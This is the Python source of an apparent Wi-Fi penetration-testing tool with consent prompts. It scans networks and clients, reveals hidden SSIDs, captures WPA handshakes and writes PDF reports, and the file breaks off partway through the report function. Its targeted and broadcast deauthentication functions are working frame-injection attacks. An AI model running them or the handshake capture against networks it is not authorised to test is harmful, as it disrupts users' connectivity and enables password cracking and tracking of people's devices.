#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║       PriVi Wireless Command Center (PWCC) v5.0                  ║
║       RF Intelligence & Wireless Audit Platform                  ║
║       Developed by Prince Ubebe | PriViSecurity                  ║
╚══════════════════════════════════════════════════════════════════╝

LEGAL NOTICE:
  This tool is intended ONLY for use on wireless networks you own
  or have explicit written authorization to audit. Deauthentication
  testing against networks you do not own is illegal under the
  Computer Misuse Act, CFAA, and equivalent laws worldwide.
  PriViSecurity accepts no liability for unauthorized use.
"""

import sys, subprocess, importlib

def _auto_install():
    """Auto-install missing dependencies. Works on live Kali, VM, and fresh installs."""
    packages = {
        "fpdf":   "fpdf2",
        "scapy":  "scapy",
        "rich":   "rich",
    }
    missing = []
    for import_name, pip_name in packages.items():
        try:
            importlib.import_module(import_name)
        except ImportError:
            missing.append(pip_name)
    if missing:
        print(f"[PriViSecurity] Installing missing packages: {', '.join(missing)}")
        subprocess.check_call([
            sys.executable, "-m", "pip", "install",
            "--break-system-packages", "-q", *missing
        ])
        print("[PriViSecurity] Done. Launching tool...\n")

_auto_install()

import threading
import time
import os
import re
from datetime import datetime
from collections import defaultdict

from scapy.all import (
    Dot11, Dot11Beacon, Dot11Deauth, Dot11Elt, Dot11EltRSN,
    Dot11ProbeReq, Dot11AssoReq, Dot11ReassoReq,
    EAPOL, RadioTap, sendp, sniff, wrpcap
)
from rich.console import Console
from rich.table import Table as RichTable
from rich.live import Live
from rich.panel import Panel
from rich.layout import Layout
from rich.text import Text
from rich.prompt import Prompt, IntPrompt
from fpdf import FPDF
from fpdf.enums import XPos, YPos

# ── GLOBALS ───────────────────────────────────────────────────────────────────

AUTHOR  = "Prince Ubebe"
BRAND   = "PriViSecurity"
VERSION = "6.0"
TOOL    = "PriVi Wireless Command Center"

console             = Console()
networks            = {}                    # {BSSID: [SSID, CH, Signal, MFP]}
ap_clients          = defaultdict(set)      # {AP_BSSID: set(client_MACs)}
client_info         = {}                    # {client_MAC: {ssid, bssid, last_seen}}
log_messages        = []
stop_threads        = False
captured_handshakes = []
_log_lock           = threading.Lock()

# Device fingerprinting — {MAC: vendor_name}
mac_vendors     = {}
# Signal history — {BSSID: [(timestamp, signal), ...]}
signal_history  = {}
# Client activity score — {MAC: frame_count}
client_activity = {}
# Hidden SSIDs revealed — {BSSID: real_ssid}
hidden_ssids    = {}
# Session timeline — list of (timestamp, event_str)
session_timeline = []
# Channel lock
locked_channel   = None
# PCAP save list
pcap_packets     = []


# ── AUTHORIZATION GATES ───────────────────────────────────────────────────────

def authorization_gate():
    os.system("clear")
    gate_text = Text()
    gate_text.append("\n  LEGAL AUTHORIZATION REQUIRED\n\n", style="bold red")
    gate_text.append(
        "  This tool performs wireless security analysis including passive\n"
        "  surveillance, client detection, EAPOL capture, and deauth testing.\n\n",
        style="white"
    )
    gate_text.append("  You MUST have one of the following:\n\n", style="white")
    gate_text.append("    [+]  You own the wireless network being audited, OR\n", style="green")
    gate_text.append("    [+]  You hold a signed Letter of Authorization (LoA).\n\n", style="green")
    gate_text.append(
        "  Deauthentication against networks you do not own is illegal.\n\n",
        style="dim white"
    )
    gate_text.append("  PriViSecurity accepts NO liability for unauthorized use.\n\n", style="dim red")
    console.print(Panel(gate_text, border_style="red",
                        title=f"[bold red]{TOOL} v{VERSION}[/bold red]"))
    console.print("[bold white]Do you have written authorization to audit the target network?[/bold white]")
    console.print("[dim]Type [bold green]AGREE[/bold green] to confirm, or Ctrl+C to exit.[/dim]\n")
    try:
        if input("  > ").strip() != "AGREE":
            console.print("\n[bold red][!] Not confirmed. Exiting.[/bold red]")
            sys.exit(0)
    except KeyboardInterrupt:
        sys.exit(0)
    console.print("\n[bold green][+] Authorization confirmed.[/bold green]\n")
    time.sleep(0.8)


def deauth_authorization_gate(mode_name: str) -> bool:
    console.print(Panel(
        f"\n  [bold red]DEAUTH MODE WARNING[/bold red]\n\n"
        f"  Mode: [bold yellow]{mode_name}[/bold yellow]\n\n"
        f"  This forcibly disconnects client(s). Only use on networks\n"
        f"  you own or have written permission to test.\n",
        border_style="red", title="[bold red]Deauth Confirmation[/bold red]"
    ))
    console.print("[dim]Type [bold green]CONFIRM[/bold green] to proceed or any other key to cancel.\n[/dim]")
    try:
        if input("  > ").strip() != "CONFIRM":
            console.print("\n[bold yellow][!] Cancelled.[/bold yellow]\n")
            return False
    except KeyboardInterrupt:
        return False
    console.print("\n[bold green][+] Confirmed.[/bold green]\n")
    return True


# ── HEADER ────────────────────────────────────────────────────────────────────

def print_header():
    os.system("clear")
    header = Text()
    header.append(
        "\n"
        "  ██████╗ ██╗    ██╗ ██████╗ ██████╗\n"
        "  ██╔══██╗██║    ██║██╔════╝██╔════╝\n"
        "  ██████╔╝██║ █╗ ██║██║     ██║\n"
        "  ██╔═══╝ ██║███╗██║██║     ██║\n"
        "  ██║     ╚███╔███╔╝╚██████╗╚██████╗\n"
        "  ╚═╝      ╚══╝╚══╝  ╚═════╝ ╚═════╝\n",
        style="bold cyan"
    )
    header.append(
        f"  {BRAND}  |  {TOOL} v{VERSION}  |  RF Intelligence & Wireless Audit Platform\n",
        style="dim white"
    )
    header.append(f"  Developer: {AUTHOR}  |  Authorized Use Only\n", style="dim red")
    console.print(Panel(header, border_style="blue"))


# ── LOGGING ───────────────────────────────────────────────────────────────────

def update_logs(msg: str):
    with _log_lock:
        log_messages.append(f"[bold green]>[/bold green] {time.strftime('%H:%M:%S')} | {msg}")
        if len(log_messages) > 12:
            log_messages.pop(0)


# ── CHANNEL HOPPER ────────────────────────────────────────────────────────────

def channel_hopper(interface: str):
    while not stop_threads:
        for ch in range(1, 14):
            if stop_threads:
                break
            os.system(f"iwconfig {interface} channel {ch} > /dev/null 2>&1")
            time.sleep(0.4)



# ── OUI VENDOR LOOKUP ─────────────────────────────────────────────────────────

_oui_cache = {}
_oui_lock  = threading.Lock()

def resolve_vendor(mac: str) -> str:
    """Resolve MAC OUI to manufacturer name. Cached in memory."""
    if not mac or len(mac) < 8:
        return "Unknown"
    prefix = mac.upper().replace("-", ":")[:8]
    with _oui_lock:
        if prefix in _oui_cache:
            return _oui_cache[prefix]
    try:
        import urllib.request
        req = urllib.request.Request(
            f"https://api.macvendors.com/{prefix}",
            headers={"User-Agent": "PWCC/6.0"}
        )
        with urllib.request.urlopen(req, timeout=3) as r:
            vendor = r.read().decode().strip()[:25]
    except Exception:
        vendor = "Unknown"
    with _oui_lock:
        _oui_cache[prefix] = vendor
    return vendor


def resolve_vendor_bg(mac: str):
    """Resolve vendor in background thread."""
    def _lookup():
        vendor = resolve_vendor(mac)
        with _oui_lock:
            mac_vendors[mac] = vendor
    threading.Thread(target=_lookup, daemon=True).start()


# ── SESSION TIMELINE ──────────────────────────────────────────────────────────

def log_event(event: str):
    """Add event to session timeline and log stream."""
    ts = time.strftime("%H:%M:%S")
    session_timeline.append((ts, event))
    update_logs(event)


# ── SIGNAL HISTORY ────────────────────────────────────────────────────────────

def update_signal(bssid: str, signal):
    """Track signal strength over time per AP."""
    try:
        s = int(signal)
    except (ValueError, TypeError):
        return
    if bssid not in signal_history:
        signal_history[bssid] = []
    signal_history[bssid].append((time.time(), s))
    # Keep last 30 readings only
    if len(signal_history[bssid]) > 30:
        signal_history[bssid].pop(0)


def signal_sparkline(bssid: str) -> str:
    """
    Generate a mini ASCII signal graph from history.
    e.g. ▁▂▃▄▅▆▇█
    """
    history = signal_history.get(bssid, [])
    if len(history) < 2:
        return ""
    bars   = " ▁▂▃▄▅▆▇█"
    values = [s for _, s in history[-10:]]
    mn, mx = min(values), max(values)
    rng    = mx - mn if mx != mn else 1
    spark  = ""
    for v in values:
        idx    = int((v - mn) / rng * (len(bars) - 1))
        spark += bars[idx]
    return spark


# ── HIDDEN SSID REVEALER ──────────────────────────────────────────────────────

def check_hidden_ssid(pkt):
    """
    When a client associates with an AP that has a hidden SSID,
    the association request contains the real SSID.
    Capture and expose it.
    """
    if pkt.haslayer(Dot11AssoReq) or pkt.haslayer(Dot11ReassoReq):
        ap_mac = pkt[Dot11].addr1
        if ap_mac in networks and networks[ap_mac][0] in ("Hidden", "", "\x00"):
            try:
                real_ssid = pkt[Dot11Elt].info.decode(errors="ignore").strip()
                if real_ssid and real_ssid != "Hidden":
                    hidden_ssids[ap_mac] = real_ssid
                    networks[ap_mac][0]  = f"{real_ssid} [revealed]"
                    log_event(f"[bold magenta][!] HIDDEN SSID REVEALED: {ap_mac} = '{real_ssid}'[/bold magenta]")
            except Exception:
                pass


def is_real_client(mac: str) -> bool:
    """
    Filter out multicast, broadcast and reserved MACs.
    Only real unicast client devices pass this check.

    Rules:
    - ff:ff:ff:ff:ff:ff = broadcast — skip
    - 01:00:5e:xx:xx:xx = IPv4 multicast — skip
    - 33:33:xx:xx:xx:xx = IPv6 multicast — skip
    - Any MAC where LSB of first octet = 1 = multicast — skip
    - Empty or too short — skip
    """
    if not mac or len(mac) < 17:
        return False
    mac_lower = mac.lower()
    # Broadcast
    if mac_lower == "ff:ff:ff:ff:ff:ff":
        return False
    # IPv4 multicast
    if mac_lower.startswith("01:00:5e"):
        return False
    # IPv6 multicast
    if mac_lower.startswith("33:33"):
        return False
    # Generic multicast check — LSB of first octet
    try:
        first_octet = int(mac_lower.split(":")[0], 16)
        if first_octet & 1:
            return False
    except ValueError:
        return False
    return True

# ── PACKET CALLBACK ───────────────────────────────────────────────────────────

def packet_callback(pkt, lab_ssid: str, lab_bssid: str):
    global networks, ap_clients, client_info

    # Store packet for PCAP save
    pcap_packets.append(pkt)
    if len(pcap_packets) > 5000:
        pcap_packets.pop(0)

    # Beacon frames - AP discovery
    if pkt.haslayer(Dot11Beacon):
        bssid = pkt[Dot11].addr2
        if not bssid:
            return
        try:
            ssid = pkt[Dot11Elt].info.decode(errors="ignore").strip() or "Hidden"
        except Exception:
            ssid = "Hidden"

        # Evil twin detection
        is_new = bssid not in networks
        if (lab_ssid and ssid == lab_ssid and
                lab_bssid and bssid.lower() != lab_bssid.lower()):
            log_event(f"[bold red][!] EVIL TWIN: {bssid} -> '{ssid}'[/bold red]")
            ssid = f"{ssid} [EVIL TWIN]"

        mfp = "Disabled"
        if pkt.haslayer(Dot11EltRSN):
            try:
                cap = pkt[Dot11EltRSN].cap
                if cap & 0x40 or cap & 0x80:
                    mfp = "Protected"
            except Exception:
                pass

        try:
            channel = pkt[Dot11Beacon].network_stats().get("channel", "?")
            signal  = pkt.dBm_AntSignal
        except Exception:
            channel, signal = "?", "?"

        networks[bssid] = [ssid, channel, signal, mfp]
        update_signal(bssid, signal)

        # Log new network discovery
        if is_new:
            log_event(f"[green]NEW AP: {bssid} | {ssid} | CH:{channel} | {mfp}[/green]")
            resolve_vendor_bg(bssid)

    # Probe requests - devices scanning for networks
    if pkt.haslayer(Dot11ProbeReq):
        client_mac = pkt[Dot11].addr2
        if client_mac and client_mac != "ff:ff:ff:ff:ff:ff":
            if client_mac not in client_info:
                client_info[client_mac] = {
                    "ssid": "Probing...", "bssid": "---",
                    "last_seen": time.time()
                }
            else:
                client_info[client_mac]["last_seen"] = time.time()

    # Association frames - client joining AP
    if pkt.haslayer(Dot11AssoReq) or pkt.haslayer(Dot11ReassoReq):
        client_mac = pkt[Dot11].addr2
        ap_mac     = pkt[Dot11].addr1
        if client_mac and ap_mac and is_real_client(client_mac):
            ap_clients[ap_mac].add(client_mac)
            try:
                ssid = pkt[Dot11Elt].info.decode(errors="ignore").strip()
            except Exception:
                ssid = networks.get(ap_mac, ["Unknown"])[0]
            client_info[client_mac] = {
                "ssid": ssid, "bssid": ap_mac,
                "last_seen": time.time()
            }
            update_logs(f"[cyan]CLIENT JOINED: {client_mac} -> {ap_mac} ({ssid})[/cyan]")

    # Data frames - infer clients + activity scoring
    if pkt.haslayer(Dot11) and pkt.type == 2:
        addr1 = pkt[Dot11].addr1
        addr2 = pkt[Dot11].addr2
        addr3 = pkt[Dot11].addr3

        if addr2 and addr3 and addr3 in networks:
            if is_real_client(addr2) and addr2 != addr3:
                ap_clients[addr3].add(addr2)
                # Activity scoring
                client_activity[addr2] = client_activity.get(addr2, 0) + 1
                if addr2 not in client_info:
                    client_info[addr2] = {
                        "ssid":      networks[addr3][0],
                        "bssid":     addr3,
                        "vendor":    mac_vendors.get(addr2, ""),
                        "last_seen": time.time()
                    }
                    resolve_vendor_bg(addr2)
                    log_event(f"[cyan]CLIENT: {addr2} on {networks[addr3][0]}[/cyan]")
                else:
                    client_info[addr2]["last_seen"] = time.time()

        if addr1 and addr3 and addr3 in networks:
            if is_real_client(addr1) and addr1 != addr3:
                ap_clients[addr3].add(addr1)
                client_activity[addr1] = client_activity.get(addr1, 0) + 1
                if addr1 not in client_info:
                    client_info[addr1] = {
                        "ssid":      networks[addr3][0],
                        "bssid":     addr3,
                        "vendor":    mac_vendors.get(addr1, ""),
                        "last_seen": time.time()
                    }
                    resolve_vendor_bg(addr1)
                else:
                    client_info[addr1]["last_seen"] = time.time()

    # Hidden SSID revealer
    check_hidden_ssid(pkt)

    # EAPOL - handshake capture
    if pkt.haslayer(EAPOL):
        src  = pkt[Dot11].addr2 if pkt.haslayer(Dot11) else "Unknown"
        bss  = pkt[Dot11].addr3 if pkt.haslayer(Dot11) else "Unknown"
        ssid = networks.get(bss, ["Unknown"])[0] if bss in networks else "Unknown"
        update_logs(f"[bold magenta][EAPOL] Handshake from {src} on {ssid}[/bold magenta]")
        captured_handshakes.append(pkt)


# ── DEAUTH FUNCTIONS ──────────────────────────────────────────────────────────

def targeted_deauth(interface: str, target_bssid: str,
                    client_mac: str, count: int = 50):
    update_logs(f"[yellow]Deauth: {client_mac} -> {target_bssid} ({count} frames)[/yellow]")
    pkt = (
        RadioTap() /
        Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid) /
        Dot11Deauth(reason=7)
    )
    try:
        sendp(pkt, iface=interface, count=count, inter=0.1, verbose=False)
        update_logs(f"[green]Done: {count} frames sent[/green]")
    except Exception as e:
        update_logs(f"[red]Deauth error: {e}[/red]")


def broadcast_deauth(interface: str, target_bssid: str, count: int = 50):
    update_logs(f"[yellow]Broadcast deauth on {target_bssid} ({count} frames)[/yellow]")
    pkt = (
        RadioTap() /
        Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) /
        Dot11Deauth(reason=7)
    )
    try:
        sendp(pkt, iface=interface, count=count, inter=0.1, verbose=False)
        update_logs(f"[green]Broadcast done[/green]")
    except Exception as e:
        update_logs(f"[red]Deauth error: {e}[/red]")


# ── TABLE BUILDERS ────────────────────────────────────────────────────────────

def build_network_table() -> RichTable:
    t = RichTable(title="[bold cyan]Detected Networks[/bold cyan]",
                  expand=True, border_style="blue", show_lines=True)
    t.add_column("BSSID",    style="yellow",     width=19)
    t.add_column("SSID",     style="white",       width=20)
    t.add_column("CH",       style="green",       width=4)
    t.add_column("Signal",   style="magenta",     width=9)
    t.add_column("Trend",    style="cyan",        width=11)
    t.add_column("MFP",      style="cyan",        width=12)
    t.add_column("Clients",  style="bold yellow", width=8)
    t.add_column("Vendor",   style="dim white",   width=14)
    for bssid, info in list(networks.items()):
        ssid, ch, sig, mfp = info
        count  = len(ap_clients.get(bssid, set()))
        mfp_s  = "[bold green]Protected[/bold green]" if mfp == "Protected" \
                 else "[dim red]Disabled[/dim red]"
        vendor = mac_vendors.get(bssid, "")
        spark  = signal_sparkline(bssid)
        try:
            s     = int(sig)
            sig_s = f"[bold green]{s}[/bold green]" if s >= -50 \
                    else f"[yellow]{s}[/yellow]" if s >= -70 \
                    else f"[dim red]{s}[/dim red]"
        except Exception:
            sig_s = str(sig)
        t.add_row(
            bssid, str(ssid)[:20], str(ch),
            f"{sig_s} dBm", f"[cyan]{spark}[/cyan]",
            mfp_s,
            f"[bold yellow]{count}[/bold yellow]" if count else "0",
            vendor[:14]
        )
    return t


def build_client_table() -> RichTable:
    t = RichTable(title="[bold cyan]Connected Clients[/bold cyan]",
                  expand=True, border_style="blue", show_lines=True)
    t.add_column("Client MAC",  style="bold yellow", width=22)
    t.add_column("Vendor",      style="white",       width=14)
    t.add_column("SSID",        style="white",       width=18)
    t.add_column("AP BSSID",    style="dim white",   width=19)
    t.add_column("Activity",    style="cyan",        width=10)
    t.add_column("Last Seen",   style="dim white",   width=10)
    now = time.time()
    # Sort by activity score (most active first)
    sorted_clients = sorted(
        client_info.items(),
        key=lambda x: client_activity.get(x[0], 0),
        reverse=True
    )[:20]
    for mac, info in sorted_clients:
        last     = int(now - info.get("last_seen", now))
        last_str = f"{last}s ago" if last < 60 else f"{last // 60}m ago"
        vendor   = mac_vendors.get(mac, info.get("vendor", ""))
        activity = client_activity.get(mac, 0)
        # Activity bar
        bars = min(activity // 10, 8)
        act_bar = f"[cyan]{'|' * bars}[/cyan][dim]{'.' * (8 - bars)}[/dim] {activity}"
        t.add_row(
            mac, vendor[:14],
            str(info.get("ssid", ""))[:18],
            str(info.get("bssid", ""))[:19],
            act_bar, last_str
        )
    return t


# ── MODE HANDLERS ─────────────────────────────────────────────────────────────

def run_passive_surveillance(interface: str, lab_ssid: str, lab_bssid: str):
    log_event("Full-spectrum surveillance active. Channel hopping started.")
    layout = Layout()
    layout.split_column(
        Layout(name="top",      size=18),
        Layout(name="bottom",   size=12),
        Layout(name="log",      size=6),
    )
    layout["top"].split_row(
        Layout(name="networks", ratio=3),
        Layout(name="clients",  ratio=2),
    )
    tick = 0
    with Live(layout, refresh_per_second=2, screen=True):
        while not stop_threads:
            layout["networks"].update(build_network_table())
            layout["clients"].update(build_client_table())
            # Alternate bottom panel between timeline and stats
            if tick % 8 < 4:
                layout["bottom"].update(build_timeline_table())
            else:
                # Stats summary panel
                total_nets    = len(networks)
                total_clients = len(client_info)
                protected     = sum(1 for v in networks.values() if v[3] == "Protected")
                unprotected   = total_nets - protected
                top_client    = max(client_activity, key=client_activity.get) if client_activity else "None"
                top_activity  = client_activity.get(top_client, 0)
                revealed      = len(hidden_ssids)

                stats = RichTable(
                    title="[bold cyan]Session Stats[/bold cyan]",
                    expand=True, border_style="blue", show_lines=False
                )
                stats.add_column("Metric",  style="bold white", width=30)
                stats.add_column("Value",   style="cyan")
                stats.add_row("Networks Detected",    str(total_nets))
                stats.add_row("Clients Detected",     str(total_clients))
                stats.add_row("Handshakes Captured",  str(len(captured_handshakes)))
                stats.add_row("MFP Protected APs",    str(protected))
                stats.add_row("Unprotected APs",
                    f"[bold red]{unprotected}[/bold red]" if unprotected else "0")
                stats.add_row("Hidden SSIDs Revealed",str(revealed))
                stats.add_row("Most Active Client",
                    f"{top_client} ({top_activity} frames)" if top_client != "None" else "None")
                stats.add_row("Events Logged",        str(len(session_timeline)))
                layout["bottom"].update(stats)
            tick += 1
            with _log_lock:
                layout["log"].update(Panel(
                    "\n".join(log_messages[-4:]),
                    title="[bold green]Stream[/bold green]",
                    border_style="green"
                ))
            time.sleep(1)


def run_handshake_hunt(interface: str, lab_ssid: str, lab_bssid: str):
    update_logs("Handshake hunt active. Monitoring EAPOL frames.")
    run_passive_surveillance(interface, lab_ssid, lab_bssid)


def run_targeted_deauth(interface: str):
    if not deauth_authorization_gate("Targeted Deauth - Single Client"):
        return

    # Auto-scan to discover clients before prompting
    console.print(
        "\n[bold cyan][*] Scanning for 10 seconds to discover clients...[/bold cyan]\n"
        "[dim]    Make sure your target device is actively using the network "
        "(browsing, streaming, etc.) for best detection.[/dim]\n"
    )
    time.sleep(10)

    # Show networks
    if networks:
        nt = RichTable(title="[bold cyan]Detected Networks[/bold cyan]",
                       border_style="blue", show_lines=True)
        nt.add_column("BSSID",   style="yellow", width=19)
        nt.add_column("SSID",    style="white",  width=25)
        nt.add_column("CH",      style="green",  width=5)
        nt.add_column("Clients", style="bold yellow", width=8)
        for bssid, info in networks.items():
            nt.add_row(bssid, str(info[0])[:25], str(info[1]),
                       str(len(ap_clients.get(bssid, set()))))
        console.print(nt)
        console.print()

    # Show clients
    if client_info:
        ct = RichTable(
            title="[bold cyan]Discovered Clients  -  Copy the MAC you want to deauth[/bold cyan]",
            border_style="blue", show_lines=True
        )
        ct.add_column("Client MAC", style="bold yellow", width=22)
        ct.add_column("SSID",       style="white",       width=25)
        ct.add_column("AP BSSID",   style="dim white",   width=19)
        ct.add_column("Last Seen",  style="dim white",   width=10)
        now = time.time()
        for mac, info in sorted(client_info.items(),
                                key=lambda x: x[1].get("last_seen", 0),
                                reverse=True)[:20]:
            last = int(now - info.get("last_seen", now))
            ct.add_row(mac, str(info.get("ssid", ""))[:25],
                       str(info.get("bssid", ""))[:19],
                       f"{last}s ago")
        console.print(ct)
    else:
        console.print(
            "[bold yellow][!] No clients detected yet.\n"
            "    Tips:\n"
            "    1. Make sure your device is actively sending traffic\n"
            "    2. Confirm your adapter is in monitor mode: sudo airmon-ng start wlan0\n"
            "    3. Try running Mode 1 first to confirm you can see the network\n[/bold yellow]"
        )

    console.print()
    target_bssid = Prompt.ask("[cyan]Target AP BSSID[/cyan]  (from table above)").strip()
    client_mac   = Prompt.ask("[cyan]Client MAC[/cyan]      (from table above)").strip()
    count        = IntPrompt.ask(
        "[cyan]Frame count[/cyan]  "
        "[dim](50 = ~5 sec | 100 = ~10 sec | 200 = ~20 sec)[/dim]",
        default=50
    )

    update_logs(f"Deauth: {client_mac} -> {target_bssid} ({count} frames)")
    targeted_deauth(interface, target_bssid, client_mac, count)
    console.print(
        f"\n[bold green][+] Done. {count} frames sent.[/bold green]\n"
        "[dim]Your device should reconnect automatically in a few seconds.[/dim]"
    )


def run_broadcast_deauth(interface: str):
    if not deauth_authorization_gate("Broadcast Deauth - All Clients on AP"):
        return

    console.print("\n[bold cyan][*] Scanning for 10 seconds...[/bold cyan]\n")
    time.sleep(10)

    if networks:
        nt = RichTable(title="[bold cyan]Networks  -  Pick your target AP[/bold cyan]",
                       border_style="blue", show_lines=True)
        nt.add_column("BSSID",   style="yellow", width=19)
        nt.add_column("SSID",    style="white",  width=25)
        nt.add_column("CH",      style="green",  width=5)
        nt.add_column("Clients", style="bold yellow", width=8)
        for bssid, info in networks.items():
            nt.add_row(bssid, str(info[0])[:25], str(info[1]),
                       str(len(ap_clients.get(bssid, set()))))
        console.print(nt)
        console.print()

    target_bssid = Prompt.ask("[cyan]Target AP BSSID[/cyan]").strip()
    count        = IntPrompt.ask(
        "[cyan]Frame count[/cyan]  "
        "[dim](50 = ~5 sec | 100 = ~10 sec | 200 = ~20 sec)[/dim]",
        default=50
    )

    update_logs(f"Broadcast deauth on {target_bssid} ({count} frames)")
    broadcast_deauth(interface, target_bssid, count)
    console.print(
        f"\n[bold green][+] Done. {count} frames sent to all clients.[/bold green]\n"
        "[dim]All clients on the AP should reconnect automatically.[/dim]"
    )



# ── PCAP SAVE ─────────────────────────────────────────────────────────────────

def save_pcap() -> str:
    """Save captured packets to a .cap file for Wireshark analysis."""
    if not pcap_packets:
        console.print("[dim]No packets captured — skipping PCAP save.[/dim]")
        return None
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = f"PWCC_Capture_{timestamp}.cap"
    try:
        wrpcap(fname, pcap_packets)
        console.print(f"[bold green][+] PCAP saved:[/bold green] [cyan]{fname}[/cyan]")
        console.print(f"[dim]    Open with: wireshark {fname}[/dim]")
        return fname
    except Exception as e:
        console.print(f"[bold red][!] PCAP save failed: {e}[/bold red]")
        return None


def build_timeline_table() -> RichTable:
    """Build session event timeline table for terminal display."""
    t = RichTable(
        title="[bold cyan]Session Timeline[/bold cyan]",
        expand=True, border_style="blue", show_lines=True
    )
    t.add_column("Time",  style="dim white",  width=10)
    t.add_column("Event", style="white")
    for ts, event in session_timeline[-20:]:
        clean_event = event
        import re as _re
        clean_event = _re.sub(r"\[.*?\]", "", event)
        t.add_row(ts, clean_event[:100])
    return t


# ── PDF REPORT ────────────────────────────────────────────────────────────────

class PWCCReport(FPDF):
    def header(self):
        self.set_fill_color(26, 26, 46)
        self.rect(0, 0, 210, 38, "F")
        self.set_xy(10, 8)
        self.set_font("Helvetica", "B", 18)
        self.set_text_color(255, 255, 255)
        self.cell(0, 10, "PriVi Wireless Audit Report",
                  new_x=XPos.LMARGIN, new_y=YPos.NEXT)
        self.set_xy(10, 20)
        self.set_font("Helvetica", "", 10)
        self.set_text_color(180, 180, 180)
        self.cell(0, 8, f"PriViSecurity  |  {TOOL} v{VERSION}",
                  new_x=XPos.LMARGIN, new_y=YPos.NEXT)
        self.ln(18)

    def footer(self):
        self.set_y(-14)
        self.set_font("Helvetica", "I", 8)
        self.set_text_color(150, 150, 150)
        self.cell(
            0, 10,
            f"Page {self.page_no()}  |  Powered by PriViSecurity  |  Developed by Prince Ubebe",
            align="C"
        )

    def section_title(self, title: str):
        self.set_fill_color(196, 30, 58)
        self.set_text_color(255, 255, 255)
        self.set_font("Helvetica", "B", 11)
        self.cell(0, 9, f"  {title}", fill=True,
                  new_x=XPos.LMARGIN, new_y=YPos.NEXT)
        self.set_text_color(0, 0, 0)
        self.ln(2)

    def kv(self, key: str, value: str):
        self.set_font("Helvetica", "B", 9)
        self.set_text_color(60, 60, 60)
        self.cell(50, 7, f"  {key}:", new_x=XPos.RIGHT, new_y=YPos.TOP)
        self.set_font("Helvetica", "", 9)
        self.set_text_color(0, 0, 0)
        self.cell(0, 7, str(value)[:100], new_x=XPos.LMARGIN, new_y=YPos.NEXT)

    @staticmethod
    def clean(text: str) -> str:
        text = re.sub(r"\[.*?\]", "", str(text))
        return text.encode("ascii", "ignore").decode("ascii").strip()


def generate_pdf_report(scan_data: dict, client_data: dict,
                        handshake_count: int, mode_used: str,
                        pcap_file: str = None,
                        operator: dict = None) -> str:
    if not scan_data:
        return None

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename  = f"PWCC_Wireless_Audit_{timestamp}.pdf"
    op_name   = (operator or {}).get("name", "Operator")
    op_org    = (operator or {}).get("org", "")

    pdf = PWCCReport()
    pdf.add_page()

    pdf.section_title("1. Audit Summary")
    pdf.kv("Conducted by", op_name + (f"  |  {op_org}" if op_org else ""))
    pdf.kv("Tool",         f"{TOOL} v{VERSION}")
    pdf.kv("Date",         datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    pdf.kv("Mode",         mode_used)
    pdf.kv("Networks",          str(len(scan_data)))
    pdf.kv("Clients Detected",  str(len(client_data)))
    pdf.kv("Handshakes",        str(handshake_count))
    pdf.kv("Hidden SSIDs Found",str(len(hidden_ssids)))
    pdf.kv("Events Logged",     str(len(session_timeline)))
    pdf.kv("PCAP File",         pcap_file or "Not saved")
    pdf.ln(4)

    pdf.section_title("2. Detected Networks")
    pdf.set_font("Helvetica", "B", 8)
    pdf.set_fill_color(26, 26, 46)
    pdf.set_text_color(255, 255, 255)
    for col, w in [("BSSID", 42), ("SSID", 55), ("CH", 12),
                   ("Signal", 22), ("MFP", 22), ("Clients", 0)]:
        kw = {"new_x": XPos.RIGHT, "new_y": YPos.TOP} if w else \
             {"new_x": XPos.LMARGIN, "new_y": YPos.NEXT}
        pdf.cell(w if w else 0, 7, col, fill=True, align="C", **kw)

    pdf.set_font("Helvetica", "", 7)
    pdf.set_text_color(0, 0, 0)
    alt = False
    for bssid, info in scan_data.items():
        pdf.set_fill_color(245, 245, 250) if alt else pdf.set_fill_color(255, 255, 255)
        alt = not alt
        ssid, ch, sig, mfp = info
        for val, w in [
            (bssid, 42), (pdf.clean(ssid)[:24], 55),
            (str(ch), 12), (f"{pdf.clean(str(sig))} dBm", 22),
            (pdf.clean(mfp)[:10], 22),
            (str(len(ap_clients.get(bssid, set()))), 0)
        ]:
            kw = {"new_x": XPos.RIGHT, "new_y": YPos.TOP} if w else \
                 {"new_x": XPos.LMARGIN, "new_y": YPos.NEXT}
            pdf.cell(w if w else 0, 6, str(val), fill=True, **kw)
    pdf.ln(4)

    pdf.section_title("3. Detected Clients")
    if client_data:
        pdf.set_font("Helvetica", "B", 8)
        pdf.set_fill_color(26, 26, 46)
        pdf.set_text_color(255, 255, 255)
        for col, w in [("Client MAC", 50), ("SSID", 70), ("AP BSSID", 0)]:
            kw = {"new_x": XPos.RIGHT, "new_y": YPos.TOP} if w else \
                 {"new_x": XPos.LMARGIN, "new_y": YPos.NEXT}
            pdf.cell(w if w else 0, 7, col, fill=True, align="C", **kw)
        pdf.set_font("Helvetica", "", 7)
        pdf.set_text_color(0, 0, 0)
        alt = False
        for mac, info in list(client_data.items())[:50]:
            pdf.set_fill_color(245, 245, 250) if alt else pdf.set_fill_color(255, 255, 255)
            alt = not alt
            for val, w in [
                (mac, 50),
                (pdf.clean(info.get("ssid", ""))[:30], 70),
                (info.get("bssid", "")[:19], 0)
            ]:
                kw = {"new_x": XPos.RIGHT, "new_y": YPos.TOP} if w else \
                     {"new_x": XPos.LMARGIN, "new_y": YPos.NEXT}
                pdf.cell(w if w else 0, 6, str(val), fill=True, **kw)
    else:
        pdf.set_font("Helvetica", "I", 9)
        pdf.cell(0, 6, "  No clients detected.",
                 new_x=XPos.LMARGIN, new_y=YPos.NEXT)
    pdf.ln(4)

    pdf.section_title("4. Security Observations")
    pdf.set_font("Helvetica", "", 9)
    unprotected = [b for b, i in scan_data.items() if "Protected" not in i[3]]
    evil_twins  = [b for b, i in scan_data.items() if "EVIL TWIN" in str(i[0])]
    if evil_twins:
        pdf.set_text_color(196, 30, 58)
        pdf.multi_cell(0, 6, f"  [!] EVIL TWIN DETECTED: {', '.join(evil_twins)}")
        pdf.ln(2)
    if unprotected:
        pdf.set_text_color(40, 40, 40)
        pdf.multi_cell(0, 6,
            f"  {len(unprotected)} network(s) without 802.11w MFP.")
        pdf.ln(2)
    if handshake_count > 0:
        pdf.set_text_color(40, 40, 40)
        pdf.multi_cell(0, 6, f"  {handshake_count} EAPOL handshake(s) captured.")
